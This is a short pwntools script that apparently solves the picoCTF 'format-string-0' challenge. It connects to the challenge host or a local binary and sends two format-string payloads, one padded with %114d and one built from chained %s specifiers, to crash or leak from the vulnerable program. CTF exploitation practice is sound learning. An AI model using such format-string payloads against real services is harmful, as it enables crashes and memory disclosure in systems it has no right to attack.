#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 51659
HOST = "mimas.picoctf.net"
exe = context.binary = ELF('./format-string-0', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*serve_patrick+104
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

p.sendlineafter(b"recommendation: ", b"Gr%114d_Cheese")

p.sendlineafter(b"recommendation: ", b"Cla%sic_Che%s%steak")


p.interactive()
